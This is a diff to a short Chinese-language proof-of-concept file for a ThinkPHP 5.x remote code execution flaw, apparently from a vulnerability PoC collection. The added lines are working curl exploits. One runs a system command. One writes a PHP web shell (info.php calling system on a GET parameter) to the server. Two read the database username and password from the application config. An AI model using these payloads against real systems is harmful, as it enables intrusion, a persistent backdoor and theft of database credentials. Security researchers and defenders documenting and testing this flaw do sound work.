@@ -12,8 +12,15 @@
 Poc
 
 ```
+# 执行命令
 curl -g '127.0.0.1/public/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'
+
+# 写文件
 curl -g '127.0.0.1/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=info.php&vars[1][]=<?php%20system($_GET[0]);?>'
+
+# 获取参数
+curl -g '127.0.0.1/public/index.php/?s=index/\think\config/get&name=database.username'
+curl -g '127.0.0.1/public/index.php/?s=index/\think\config/get&name=database.password'
 ```
 
 参考文档
